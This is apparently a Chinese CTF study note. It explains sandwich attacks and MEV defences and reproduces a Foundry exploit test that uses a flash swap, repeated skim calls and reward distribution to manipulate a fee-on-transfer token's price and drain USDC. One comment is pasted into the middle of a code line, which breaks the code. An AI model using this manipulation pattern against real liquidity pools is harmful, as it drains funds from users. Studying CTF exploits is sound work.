一个典型的Sandwich Attack，让地址0xf2331a2d 的账户持有 9999999 个 USDC
Sandwich Attack:攻击者使用前后两个合约order恶意操纵价格，用front-run和back-run把目标交易夹在中间赚取利润

防范：有[1inch](https://help.1inch.io/en/articles/5300755-what-are-flashbot-transactions-and-how-do-they-work-on-1inch)做的“flashbot transactions”order，不广播到mempool中，与miner直接连接，保证用户以理想金额进行交易

用户方：
要么提高gas（付出代价）
或者小额多交易（也是另一种增加gas消耗？x）

这个题也是类型初见，之前也只是听闻，只能照着wp解读一下
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

``` solidity
import {Test} from "forge-std/Test.sol";
import {Ketai, Challenge} from "../src/Challenge.sol";
import "forge-std/console.sol";

contract KetaiTest is Test {
    ChallengeKetai public chal;

    function setUp() public {
        chal = new ChallengeKetai();
    }

    function test_ketai() public {
        // conduct flashswap  闪电贷交易根据Ketai是否为token0，确定借入amount0或amount1。
        uint256 amount0 = 0;
        uint256 amount1 = 0;
        if (chal.ketaiUSDCPair().token0() == address(chal.ketai())) {
            amount0 = 4900000 * 1e18;
            //如果条件成立，将 amount0 设置为 4900000 乘以 1e18。
        } else {
            amount1 = 4900000 * 1e18;
        }
        chal.ketaiUSDCPair().swap(amount0, amount1, address(this), "123");

        // sell ketai
        KetaiToUSDC(chal.ketai().balanceOf(address(this)));//调用 KetaiToUSDC 函数将 Ketai 代币的余额转换为 USDC 代币。
        console.log("usdc balance", chal.usdc().balanceOf(address(this)));

        // transfer usdc
        chal.usdc().transfer(address(chal.randomFolks()), chal.usdc().将当前地址的 USDC 代币余额转移给 randomFolks 地址。balanceOf(address(this)));

        // check if solved
        assertTrue(chal.isSolved(), "chal is not solved");
    }

    function KetaiToUSDT(uint256 amount) internal {
        chal.ketai().approve(address(chal.router()), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(chal.ketai());
        path[1] = address(chal.usdt());
        chal.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );//交换的代币数量 amount、最小接收数量、交换路径 path、接收地址（本合约地址）以及交换操作发生的时间戳。
    }

    function USDTToKetai(uint256 amount) internal {
        chal.usdt().approve(address(chal.router()), type(uint256).max);
        address[] memory path = new address[](2);//声明了一个长度为 2 的地址数组 path，用于指定交换路径。
        path[1] = address(chal.ketai());
        path[0] = address(chal.usdt());
        chal.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    function KetaiToUSDC(uint256 amount) internal {
        chal.ketai().approve(address(chal.router()), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(chal.ketai());
        path[1] = address(chal.usdc());
        chal.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    //回调处理
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("start balance", chal.ketai().balanceOf(address(this)));

        //通过调用skim方法频繁调整ketaiUSDTPair的流动性，影响Ketai的价格。
        for (uint256 c = 0; c < 25; c++) {
            uint256 ketaiBalance = chal.ketai().balanceOf(address(this));
            chal.ketai().transfer(address(chal.ketaiUSDTPair()), ketaiBalance / 10);
            for (uint256 i = 0; i < 200; i++) {
                chal.ketaiUSDTPair().skim(address(chal.ketaiUSDTPair()));
            }
            chal.ketaiUSDTPair().skim(address(this));
            KetaiToUSDT(ketaiBalance * 9 / 10);
            uint256 usdtBalance = chal.usdt().balanceOf(address(this));

            for (uint256 i = 0; i < 100 / (c + 1); i++) {
                chal.ketai().distributeReward();
            }

            USDTToKetai(usdtBalance);
        }

        // pay debt
        chal.ketai().transfer(address(chal.ketaiUSDCPair()), 4900000 * 1e18 * 1125 / 1000);

        console.log("end balance", chal.ketai().balanceOf(address(this)));
    }
}

```

